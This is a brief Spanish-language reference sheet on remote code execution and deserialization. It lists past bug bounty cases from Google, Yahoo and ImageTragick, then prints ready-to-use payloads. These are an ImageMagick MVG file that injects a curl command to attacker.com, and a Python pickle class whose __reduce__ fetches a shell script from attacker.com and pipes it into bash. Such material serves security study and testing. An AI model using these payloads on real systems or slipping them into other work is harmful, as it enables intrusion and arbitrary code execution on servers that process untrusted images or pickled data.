# RCE & Deserialization Reference Matrix

## 1. Casos Históricos en Bug Bounty (`ngalongc/bug-bounty-reference`)

- **Google Console Command Injection ($6,000 Bounty)**: *Venkat S* - Inyección de comandos en el módulo de compilación e inspección de consolas cloud de Google.
- **Yahoo SQLi to RCE to Root**: *Ebrahim Hegazy* - Escalación progresiva desde una inyección SQL en la interfaz web de Yahoo hasta ejecución remota de comandos como usuario `root`.
- **ImageTragick en Procesadores de Imágenes**: *Varios Autores* - RCE en múltiples plataformas de Bug Bounty al subir imágenes con payloads `MVG` aprovechando delegados de ImageMagick:
  ```mvg
  push graphic-context
  viewbox 0 0 640 480
  image over 0,0 0,0 'https://127.0.0.1/image.jpg"|curl http://attacker.com/rce"'
  pop graphic-context
  ```

## 2. Payloads Destacados de Python Pickle Deserialization

```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = "curl http://attacker.com/shell.sh | bash"
        return (os.system, (cmd,))

print(base64.b64encode(pickle.dumps(RCE())))
```
